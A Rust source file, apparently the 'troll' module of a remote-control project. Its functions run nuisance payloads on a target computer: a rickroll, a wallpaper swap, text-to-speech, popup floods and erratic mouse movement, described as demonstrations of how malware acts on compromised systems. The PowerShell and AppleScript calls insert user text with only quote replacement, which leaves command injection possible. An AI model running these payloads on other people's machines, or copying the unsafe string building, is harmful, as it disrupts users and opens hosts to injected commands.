/*
// Author: Aliasgar Khimani (NovusEdge)
// Project: github.com/ARaChn3/remy
//
// Copyright: MIT License
// See the LICENSE file for more info.
*/

//! Troll commands for educational demonstrations.
//!
//! These commands demonstrate various ways malware can interact with
//! a compromised system in non-destructive but annoying ways.
//! Perfect for pranks and understanding OS interaction.

use std::process::Command;
use std::time::Duration;
use std::thread;

/// The classic rickroll URL.
/// Never gonna give you up, never gonna let you down...
const RICKROLL_URL: &str = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

/// Opens the rickroll video in the default browser.
///
/// This demonstrates how malware can interact with the user's
/// browser and open arbitrary URLs. Simple but effective.
///
/// # Returns
/// Ok(()) if the browser was opened, Err with message otherwise
pub fn rickroll() -> Result<String, String> {
    open::that(RICKROLL_URL).map_err(|e| format!("Failed to open browser: {}", e))?;
    Ok("Never gonna give you up!".to_string())
}

/// Changes the desktop wallpaper to an image from a URL.
///
/// This demonstrates how malware can modify system settings.
/// The implementation varies by OS.
///
/// # Arguments
/// * `image_url` - URL of the image to set as wallpaper
///
/// # Platform Support
/// - Windows: Uses SystemParametersInfoW
/// - Linux: Attempts gsettings (GNOME) or feh
/// - macOS: Uses osascript
pub fn change_wallpaper(image_url: &str) -> Result<String, String> {
    // First, download the image to a temp location
    // For simplicity, we'll just try to set it directly on Linux

    #[cfg(target_os = "windows")]
    {
        // Download image first, then use SystemParametersInfoW
        // This is a simplified version - real impl would download first
        Err("Windows wallpaper change requires downloading image first (TODO)".to_string())
    }

    #[cfg(target_os = "linux")]
    {
        // Try GNOME gsettings first
        let result = Command::new("gsettings")
            .args(["set", "org.gnome.desktop.background", "picture-uri", image_url])
            .output();

        match result {
            Ok(output) if output.status.success() => {
                Ok(format!("Wallpaper changed to: {}", image_url))
            }
            _ => {
                // Try feh as fallback (for WMs without gsettings)
                Command::new("feh")
                    .args(["--bg-scale", image_url])
                    .output()
                    .map_err(|e| format!("Failed to change wallpaper: {}", e))?;
                Ok(format!("Wallpaper changed to: {}", image_url))
            }
        }
    }

    #[cfg(target_os = "macos")]
    {
        let script = format!(
            r#"tell application "Finder" to set desktop picture to POSIX file "{}""#,
            image_url
        );
        Command::new("osascript")
            .args(["-e", &script])
            .output()
            .map_err(|e| format!("Failed to change wallpaper: {}", e))?;
        Ok(format!("Wallpaper changed to: {}", image_url))
    }
}

/// Makes the system speak a message using text-to-speech.
///
/// This demonstrates how malware can produce audio output,
/// which can be used for social engineering or just annoyance.
///
/// # Arguments
/// * `message` - Text to speak
///
/// # Platform Support
/// - Windows: Uses PowerShell with SAPI
/// - Linux: Uses espeak or festival
/// - macOS: Uses the `say` command
pub fn speak(message: &str) -> Result<String, String> {
    #[cfg(target_os = "windows")]
    {
        let script = format!(
            r#"Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak("{}")"#,
            message.replace('"', "'")
        );
        Command::new("powershell")
            .args(["-Command", &script])
            .output()
            .map_err(|e| format!("TTS failed: {}", e))?;
        Ok(format!("Spoke: {}", message))
    }

    #[cfg(target_os = "linux")]
    {
        // Try espeak first, then festival
        let result = Command::new("espeak").arg(message).output();

        match result {
            Ok(output) if output.status.success() => Ok(format!("Spoke: {}", message)),
            _ => {
                // Try festival as fallback
                let echo = Command::new("echo")
                    .arg(message)
                    .stdout(std::process::Stdio::piped())
                    .spawn()
                    .map_err(|e| format!("TTS failed: {}", e))?;

                Command::new("festival")
                    .arg("--tts")
                    .stdin(echo.stdout.unwrap())
                    .output()
                    .map_err(|e| format!("TTS failed: {}", e))?;

                Ok(format!("Spoke: {}", message))
            }
        }
    }

    #[cfg(target_os = "macos")]
    {
        Command::new("say")
            .arg(message)
            .output()
            .map_err(|e| format!("TTS failed: {}", e))?;
        Ok(format!("Spoke: {}", message))
    }
}

/// Shows popup message boxes repeatedly.
///
/// This demonstrates how malware can create UI elements to
/// annoy users or perform social engineering attacks.
///
/// # Arguments
/// * `message` - Message to display
/// * `count` - Number of popups to show
///
/// # Platform Support
/// - Windows: Uses msg.exe or PowerShell
/// - Linux: Uses zenity or kdialog
/// - macOS: Uses osascript
pub fn popup(message: &str, count: u32) -> Result<String, String> {
    for i in 0..count {
        #[cfg(target_os = "windows")]
        {
            let script = format!(
                r#"[System.Windows.Forms.MessageBox]::Show("{}", "Message {}")"#,
                message.replace('"', "'"),
                i + 1
            );
            let _ = Command::new("powershell")
                .args(["-Command", &format!("Add-Type -AssemblyName System.Windows.Forms; {}", script)])
                .spawn();
        }

        #[cfg(target_os = "linux")]
        {
            // Try zenity first (GTK), then kdialog (KDE)
            let result = Command::new("zenity")
                .args(["--info", "--text", message, "--title", &format!("Message {}", i + 1)])
                .spawn();

            if result.is_err() {
                let _ = Command::new("kdialog")
                    .args(["--msgbox", message, "--title", &format!("Message {}", i + 1)])
                    .spawn();
            }
        }

        #[cfg(target_os = "macos")]
        {
            let script = format!(
                r#"display dialog "{}" with title "Message {}" buttons {{"OK"}}"#,
                message.replace('"', "'"),
                i + 1
            );
            let _ = Command::new("osascript")
                .args(["-e", &script])
                .spawn();
        }

        // Small delay between popups
        thread::sleep(Duration::from_millis(500));
    }

    Ok(format!("Spawned {} popup(s)", count))
}

/// Makes the mouse cursor move erratically for a duration.
///
/// This demonstrates how malware can interfere with user input.
/// The mouse will jump around randomly, making the system
/// difficult (but not impossible) to use.
///
/// # Arguments
/// * `duration_secs` - How long to keep the mouse chaotic
///
/// # Note
/// This is a simplified implementation. Real mouse control
/// requires platform-specific APIs (Windows: SetCursorPos,
/// Linux: XWarpPointer, etc.)
pub fn mouse_chaos(duration_secs: u32) -> Result<String, String> {
    // This would require platform-specific implementations
    // For now, we'll just simulate with a message

    #[cfg(target_os = "linux")]
    {
        use rand::Rng;
        let start = std::time::Instant::now();
        let duration = Duration::from_secs(duration_secs as u64);

        while start.elapsed() < duration {
            let mut rng = rand::thread_rng();
            let x: i32 = rng.gen_range(0..1920);
            let y: i32 = rng.gen_range(0..1080);

            // xdotool can move the mouse on Linux
            let _ = Command::new("xdotool")
                .args(["mousemove", &x.to_string(), &y.to_string()])
                .output();

            thread::sleep(Duration::from_millis(50));
        }
        return Ok(format!("Mouse chaos for {} seconds complete!", duration_secs));
    }

    #[cfg(not(target_os = "linux"))]
    {
        // TODO: Implement for Windows/macOS
        Ok(format!(
            "Mouse chaos not implemented for this platform (would run for {}s)",
            duration_secs
        ))
    }
}
